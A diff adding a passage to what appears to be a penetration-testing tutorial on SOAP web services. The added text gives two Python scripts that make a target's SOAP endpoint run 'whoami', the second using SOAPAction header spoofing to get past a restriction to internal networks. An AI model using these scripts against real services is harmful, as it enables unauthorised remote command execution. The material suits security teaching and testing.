@@ -277,6 +277,38 @@ Let us take a look at the parameters.
 </s:element>
 ```
 
+We notice that there is a cmd parameter. Let us build a Python script to issue requests (save it as client.py). Note that the below script will try to have the SOAP service execute a whoami command.
+
+```
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+We get an error mentioning This function is only allowed in internal networks. We have no access to the internal networks. Does this mean we are stuck? Not yet! Let us try a SOAPAction spoofing attack, as follows.
+
+Let us build a new Python script for our SOAPAction spoofing attack (save it as client_soapaction_spoofing.py).
+
+```
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+- We specify LoginRequest in <soap:Body>, so that our request goes through. This operation is allowed from the outside.
+- We specify the parameters of ExecuteCommand because we want to have the SOAP service execute a whoami command.
+-We specify the blocked operation (ExecuteCommand) in the SOAPAction header
+
+If the web service determines the operation to be executed based solely on the SOAPAction header, we may bypass the restrictions and have the SOAP service execute a whoami command.
+
+
+If you want to be able to specify multiple commands and see the result each time, use the following Python script (save it as automate.py).
+
+
 ```
 import requests
 
